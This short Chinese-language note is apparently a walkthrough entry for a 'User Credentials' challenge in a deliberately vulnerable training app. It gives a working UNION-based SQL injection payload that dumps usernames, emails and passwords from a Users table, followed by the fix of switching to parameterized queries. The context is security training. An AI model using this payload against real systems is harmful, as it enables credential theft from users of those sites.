- User Credentials
    - 描述：通过SQL注入检索所有用户凭证。
    - 使用 Injection - D3 Database Schema 挑战中的 SQL注入及模式表查询用户表
    - 构建查询，在原始查询中使用不存在的字符串确保只显示注入的联合查询，使用填充匹配原始查询的9列
        ```foo')) UNION SELECT username,email,password,deletedAt,1,2,3,4,5 FROM Users--```

- 代码挑战
    将 SQL 查询代码部分将拼接修改为占位符预处理